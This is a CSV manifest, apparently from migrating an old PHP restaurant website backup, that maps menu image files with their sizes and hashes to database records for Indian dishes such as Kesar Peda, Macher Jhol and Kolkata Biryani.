324.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_small_img
325.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/325.jpg,407462,341988e7a8b56b4d76ab7741e9c7fe3eae23ddeed0b538f3d57770abcfcfd4be,910a2dc7e3ccb2cff43b79b18f892bcc,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_img
325.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/325.jpg,407462,341988e7a8b56b4d76ab7741e9c7fe3eae23ddeed0b538f3d57770abcfcfd4be,910a2dc7e3ccb2cff43b79b18f892bcc,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_small_img
326.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_img
326.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_small_img
327.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_img
327.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_small_img
328.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_img
328.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_small_img
329.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_img
329.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_small_img
330.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_img
330.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_small_img
331.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_img
331.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_small_img
332.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_img
332.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_small_img
333.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_img
333.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_small_img
334.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_img
334.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_small_img
335.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_img
335.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_small_img
336.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_img
336.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_small_img
337.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_img
337.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_small_img
338.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_img
338.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_small_img
340.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_img
340.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_small_img
341.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_img
341.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_small_img
342.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_img
342.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_small_img
343.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_img
343.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_small_img
344.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_img
344.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_small_img
345.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_img
345.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_small_img
346.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_img
346.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_small_img
347.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_img
347.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_small_img
348.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_img
348.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_small_img
349.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_img
349.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_small_img
350.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_img
350.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_small_img
351.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_img
351.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_small_img
352.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_img
352.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_small_img
353.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_img
353.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_small_img
354.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_img
354.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_small_img
355.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_img
355.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_small_img
356.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_img
356.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_small_img
357.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_img
357.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_small_img
358.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_img
358.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_small_img
359.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_img
359.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_small_img
360.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_img
360.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_small_img
361.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_img
361.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_small_img
362.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_img
362.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_small_img
363.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_img
363.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_small_img
364.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_img
364.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_small_img
365.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_img
365.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_small_img
366.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_img
366.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_small_img
367.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_img
367.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_small_img
368.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_img
368.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_small_img
369.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_img
369.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),product_item_tbl,37,Mint Yogurt Chutney,menu_img
370.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_img
370.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_small_img
371.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/small/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_img
371.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/small/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_small_img
372.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_img
372.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_small_img
373.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_img
373.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_small_img
374.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_img
374.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_small_img
375.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_img
